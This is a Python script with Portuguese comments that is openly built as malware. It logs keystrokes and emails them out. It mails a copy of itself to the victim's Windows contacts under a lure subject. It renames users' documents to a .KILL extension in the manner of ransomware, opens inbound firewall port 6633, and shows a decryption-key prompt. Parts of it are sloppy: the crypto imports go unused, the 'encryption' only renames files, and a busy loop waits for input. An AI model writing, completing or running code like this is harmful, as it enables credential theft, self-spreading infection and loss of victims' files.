import os
import sys
import smtplib
import getpass
import keyboard
import subprocess
import socket
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Função para capturar as teclas digitadas e enviar por e-mail
def capture_keys_and_send_email():
    keys = ""
    email = "<seu-email-aqui>"
    password = getpass.getpass(prompt="Digite sua senha de e-mail: ")
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)

    def on_key_press(event):
        nonlocal keys
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key.upper()}]"
        keys += key

    keyboard.on_press(on_key_press)

    while True:
        if keys.endswith("q[ENTER]"):
            break

    server.sendmail(email, email, keys)
    server.quit()

# Função para enviar o script por e-mail para todos os contatos da lista de e-mails do Windows
def send_script_to_contacts():
    email = "<seu-email-aqui>"
    password = getpass.getpass(prompt="Digite sua senha de e-mail: ")
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)

    # Obtém a lista de contatos do Windows
    contacts_path = os.path.expanduser("~/Contacts")
    contacts = []
    if os.path.exists(contacts_path):
        for filename in os.listdir(contacts_path):
            if filename.endswith(".contact"):
                contact_file = os.path.join(contacts_path, filename)
                with open(contact_file, "r") as file:
                    content = file.read()
                    if email in content:
                        start_index = content.find("<Email>") + len("<Email>")
                        end_index = content.find("</Email>", start_index)
                        contact_email = content[start_index:end_index]
                        contacts.append(contact_email)

    script_path = sys.argv[0]
    script_name = os.path.basename(script_path)
    script_content = ""
    with open(script_path, "r") as file:
        script_content = file.read()

    for contact_email in contacts:
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = contact_email
        msg["Subject"] = "Meu Arquivo"
        msg.attach(MIMEText("Importante: Abrir o arquivo", "plain"))
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(script_content)
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", "attachment", filename=script_name)
        msg.attach(attachment)
        server.send_message(msg)

    server.quit()

# Função para criptografar os arquivos do Windows e alterar suas extensões para .KILL
def encrypt_files():
    extensions_to_encrypt = [".txt", ".docx", ".xlsx", ".pptx"]
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            filename, extension = os.path.splitext(file)
            if extension.lower() in extensions_to_encrypt:
                full_path = os.path.join(root, file)
                new_filename = f"{filename}.KILL"
                new_full_path = os.path.join(root, new_filename)
                os.rename(full_path, new_full_path)

# Função para habilitar uma porta de comunicação externa na porta 6633
def enable_external_port():
    subprocess.Popen("netsh advfirewall firewall add rule name='Open Port 6633' dir=in action=allow protocol=TCP localport=6633", shell=True)

# Função para exibir uma mensagem de alerta em tela cheia com uma imagem e um campo para digitar a chave de descriptografia
def display_alert():
    key = input("Digite a chave de descriptografia: ")
    image_path = "alert.jpg"
    subprocess.Popen(["cmd", "/c", "start", "/MAX", image_path])
    input("Pressione Enter para continuar...")

# Função principal que executa todas as ações solicitadas
def main():
    capture_keys_and_send_email()
    send_script_to_contacts()
    encrypt_files()
    enable_external_port()
    display_alert()

# Execução do script principal
if __name__ == "__main__":
    main()
